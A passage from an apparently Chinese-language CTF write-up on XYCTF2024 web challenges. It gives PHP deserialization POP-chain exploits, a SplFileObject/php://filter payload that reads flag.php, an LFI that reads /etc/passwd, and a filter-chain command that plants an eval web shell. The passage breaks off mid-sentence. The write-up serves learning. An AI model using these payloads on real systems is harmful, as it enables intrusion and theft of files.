&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的话需要满足login中的条件，所以token需要等于password，但是token是一个随机数的md5加密</p>
<p>但是这里没有随机数种子，所以是伪随机数的可能性不大</p>
<p>其实这道题是ctfshow中的web265，用指针去打就行</p>
<p>详细参考一下我之前web265的wp<a href="https://wanth3f1ag.top/2024/11/05/web%E5%85%A5%E9%97%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87-ctfshow/">https://wanth3f1ag.top/2024/11/05/web%E5%85%A5%E9%97%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87-ctfshow/</a></p>
<p>exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = &amp;<span class="variable language_">$this</span> -&gt; token;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>传入后拿到fpclosefpclosefpcloseffflllaaaggg.php文件</p>
<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><h3 id="常规php"><a href="#常规php" class="headerlink" title="#常规php"></a>#常规php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mack</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mack-&gt;<span class="title function_ invoke__">nonExistentMethod</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$luo</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;o.O&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;luo;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wang1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$wang1</span>,<span class="variable">$wang2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chen</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;O.o&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">is_null</span>(<span class="variable">$this</span>-&gt;lao-&gt;chen) ? <span class="string">&quot;&quot;</span> : <span class="variable language_">$this</span>-&gt;lao-&gt;chen;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;xxxxx&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$num</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;学到就是赚到!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$data</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;name!=<span class="string">&#x27;&#x27;</span> || <span class="variable language_">$this</span>-&gt;num!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;旅行者别忘记旅行的意义!&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>链子也是很简单的</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E::__wakeup<span class="function"><span class="params">()</span>-&gt;</span>D::__toString<span class="function"><span class="params">()</span>-&gt;</span>B::__get<span class="function"><span class="params">()</span>-&gt;</span>A::__invoke<span class="function"><span class="params">()</span>-&gt;</span>C::__call()</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mack</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$luo</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wang1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chen</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> ;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//E::__unserialize()-&gt;D::__toString()-&gt;B::__get()-&gt;A::__invoke()-&gt;C::__call()</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">E</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; num = <span class="keyword">new</span> <span class="title function_ invoke__">D</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; name = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> -&gt; num -&gt; lao = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; num -&gt; lao -&gt; luo = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; num -&gt; lao -&gt; luo -&gt; mack = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>然后拿到saber_master_saber_master.php，继续</p>
<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Liu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$T1ng</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$upsw1ng</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$Liu</span>, <span class="variable">$T1ng</span>, <span class="variable">$upsw1ng</span> = Showmaker</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Liu = <span class="variable">$Liu</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;T1ng = <span class="variable">$T1ng</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;upsw1ng = <span class="variable">$upsw1ng</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$crypto0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$adwa</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$crypto0</span>, <span class="variable">$adwa</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;crypto0 = <span class="variable">$crypto0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">XYCTF</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;adwa-&gt;crypto0 != <span class="string">&#x27;dev1l&#x27;</span> <span class="keyword">or</span> <span class="variable language_">$this</span>-&gt;adwa-&gt;T1ng != <span class="string">&#x27;yuroandCMD258&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> False;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO3</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$KickyMu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fpclose</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$N1ght</span> = <span class="string">&quot;Crypto0&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$KickyMu</span>, <span class="variable">$fpclose</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;KickyMu = <span class="variable">$KickyMu</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fpclose = <span class="variable">$fpclose</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">XY</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;N1ght == <span class="string">&#x27;oSthing&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;WOW, You web is really good!!!\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$_POST</span>[<span class="string">&#x27;X&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;Y&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;KickyMu-&gt;<span class="title function_ invoke__">XYCTF</span>()) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">XY</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;CTF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;CTF&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的话需要在XYCTFNO1类中添加一个属性crypto0</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Liu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$T1ng</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$upsw1ng</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$crypto0</span>=<span class="string">&quot;dev1l&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$crypto0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$adwa</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO3</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$KickyMu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fpclose</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$N1ght</span> = <span class="string">&quot;oSthing&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">XYCTFNO3</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; KickyMu = <span class="keyword">new</span> <span class="title class_">XYCTFNO2</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; KickyMu -&gt; adwa = <span class="keyword">new</span> <span class="title class_">XYCTFNO1</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; KickyMu -&gt; adwa -&gt;T1ng = <span class="string">&quot;yuroandCMD258&quot;</span>;</span><br><span class="line"><span class="comment">//unserialize(serialize($a));</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//O:8:&quot;XYCTFNO3&quot;:3:&#123;s:7:&quot;KickyMu&quot;;O:8:&quot;XYCTFNO2&quot;:2:&#123;s:7:&quot;crypto0&quot;;N;s:4:&quot;adwa&quot;;O:8:&quot;XYCTFNO1&quot;:4:&#123;s:3:&quot;Liu&quot;;N;s:4:&quot;T1ng&quot;;s:13:&quot;yuroandCMD258&quot;;s:17:&quot;%00XYCTFNO1%00upsw1ng&quot;;N;s:7:&quot;crypto0&quot;;s:5:&quot;dev1l&quot;;&#125;&#125;s:7:&quot;fpclose&quot;;N;s:5:&quot;N1ght&quot;;s:7:&quot;oSthing&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p>记得在private属性的属性名加上%00</p>
<p>然后有<code>new $_POST[&#39;X&#39;]($_POST[&#39;Y&#39;]);</code>，这里的话用原生类去读取文件就行</p>
<h3 id="原生类SplFileObject读取文件"><a href="#原生类SplFileObject读取文件" class="headerlink" title="#原生类SplFileObject读取文件"></a>#原生类SplFileObject读取文件</h3><p>这里用php原生类SplFileObject读&#x2F;flag</p>
<p><img src="/../image/achieve/202411/XYCTF2024/image-20250519094207459.png" alt="image-20250519094207459"></p>
<p>SplFileObject 类中的fgets和fread方法都可以读文件，尽管这些方法没有参数，但是filename文件名是在类中确定的，所以直接传文件名就行</p>
<p>但是这里直接传flag.php不行，可能会解析，配合伪协议读就行</p>
<p>因为这里会解析，所以当然也可以写马</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET:?CTF<span class="operator">=</span>O<span class="variable">%3</span>A<span class="number">8</span><span class="variable">%3</span>A<span class="variable">%22</span>XYCTFNO<span class="number">3</span><span class="variable">%22</span><span class="variable">%3</span>A<span class="number">3</span><span class="variable">%3</span>A<span class="variable">%7</span>Bs<span class="variable">%3</span>A<span class="number">7</span><span class="variable">%3</span>A<span class="variable">%22</span>KickyMu<span class="variable">%22</span><span class="variable">%3</span>BO<span class="variable">%3</span>A<span class="number">8</span><span class="variable">%3</span>A<span class="variable">%22</span>XYCTFNO<span class="number">2</span><span class="variable">%22</span><span class="variable">%3</span>A<span class="number">2</span><span class="variable">%3</span>A<span class="variable">%7</span>Bs<span class="variable">%3</span>A<span class="number">7</span><span class="variable">%3</span>A<span class="variable">%22</span>crypto<span class="number">0</span><span class="variable">%22</span><span class="variable">%3</span>BN<span class="variable">%3</span>Bs<span class="variable">%3</span>A<span class="number">4</span><span class="variable">%3</span>A<span class="variable">%22</span>adwa<span class="variable">%22</span><span class="variable">%3</span>BO<span class="variable">%3</span>A<span class="number">8</span><span class="variable">%3</span>A<span class="variable">%22</span>XYCTFNO<span class="number">1</span><span class="variable">%22</span><span class="variable">%3</span>A<span class="number">4</span><span class="variable">%3</span>A<span class="variable">%7</span>Bs<span class="variable">%3</span>A<span class="number">3</span><span class="variable">%3</span>A<span class="variable">%22</span>Liu<span class="variable">%22</span><span class="variable">%3</span>BN<span class="variable">%3</span>Bs<span class="variable">%3</span>A<span class="number">4</span><span class="variable">%3</span>A<span class="variable">%22</span>T<span class="number">1</span>ng<span class="variable">%22</span><span class="variable">%3</span>Bs<span class="variable">%3</span>A<span class="number">13</span><span class="variable">%3</span>A<span class="variable">%22</span>yuroandCMD<span class="number">258</span><span class="variable">%22</span><span class="variable">%3</span>Bs<span class="variable">%3</span>A<span class="number">17</span><span class="variable">%3</span>A<span class="variable">%22</span><span class="variable">%00</span>XYCTFNO<span class="number">1</span><span class="variable">%00</span>upsw<span class="number">1</span>ng<span class="variable">%22</span><span class="variable">%3</span>BN<span class="variable">%3</span>Bs<span class="variable">%3</span>A<span class="number">7</span><span class="variable">%3</span>A<span class="variable">%22</span>crypto<span class="number">0</span><span class="variable">%22</span><span class="variable">%3</span>Bs<span class="variable">%3</span>A<span class="number">5</span><span class="variable">%3</span>A<span class="variable">%22</span>dev<span class="number">1</span>l<span class="variable">%22</span><span class="variable">%3</span>B<span class="variable">%7</span>D<span class="variable">%7</span>Ds<span class="variable">%3</span>A<span class="number">7</span><span class="variable">%3</span>A<span class="variable">%22</span>fpclose<span class="variable">%22</span><span class="variable">%3</span>BN<span class="variable">%3</span>Bs<span class="variable">%3</span>A<span class="number">5</span><span class="variable">%3</span>A<span class="variable">%22</span>N<span class="number">1</span>ght<span class="variable">%22</span><span class="variable">%3</span>Bs<span class="variable">%3</span>A<span class="number">7</span><span class="variable">%3</span>A<span class="variable">%22</span>oSthing<span class="variable">%22</span><span class="variable">%3</span>B<span class="variable">%7</span>D</span><br><span class="line">POST:</span><br><span class="line">X<span class="operator">=</span>SplFileObject&amp;Y<span class="operator">=</span>php://<span class="keyword">filter</span>/read<span class="operator">=</span>convert.base<span class="number">64</span>-encode/resource<span class="operator">=</span>flag.php</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/XYCTF2024/image-20250519094641413.png" alt="image-20250519094641413"></p>
<h2 id="ezLFI"><a href="#ezLFI" class="headerlink" title="ezLFI"></a>ezLFI</h2><h3 id="filter链RCE"><a href="#filter链RCE" class="headerlink" title="#filter链RCE"></a>#filter链RCE</h3><p>附件中有</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include_once</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>文件包含</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">?f</span>ile=<span class="regexp">/etc/passwd</span></span><br></pre></td></tr></table></figure>

<p>成功实现任意文件读取，可以打filter链实现RCE</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@VM-<span class="number">16</span>-<span class="number">12</span>-ubuntu:/<span class="keyword">opt</span>/php_filter_chain_RCE/php_filter_chain_generator# <span class="keyword">python3</span> php_filter_chain_generator.<span class="keyword">py</span> -h</span><br><span class="line">usage: php_filter_chain_generator.<span class="keyword">py</span> [-h] [--chain CHAIN] [--rawbase64 RAWBASE64]</span><br><span class="line"></span><br><span class="line">PHP <span class="built_in">filter</span> chain generator.</span><br><span class="line"></span><br><span class="line"><span class="keyword">options</span>:</span><br><span class="line">  -h, --<span class="keyword">help</span>            show this <span class="keyword">help</span> message <span class="built_in">and</span> <span class="keyword">exit</span></span><br><span class="line">  --chain CHAIN         Content you want <span class="keyword">to</span> generate. (you will maybe need <span class="keyword">to</span> pad with spaces <span class="keyword">for</span></span><br><span class="line">                        your payload <span class="keyword">to</span> work)</span><br><span class="line">  --rawbase64 RAWBASE64</span><br><span class="line">                        The base64 value you want <span class="keyword">to</span> test, the chain will <span class="keyword">be</span> printed <span class="keyword">as</span> base64 by</span><br><span class="line">                        PHP, useful <span class="keyword">to</span> <span class="keyword">debug</span>.</span><br></pre></td></tr></table></figure>

<p>用phpinfo试一下</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">python3 php_filter_chain_generator.py --chain &#x27;</span><span class="language-php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><span class="language-xml">&#x27;</span></span><br></pre></td></tr></table></figure>

<p>传入</p>
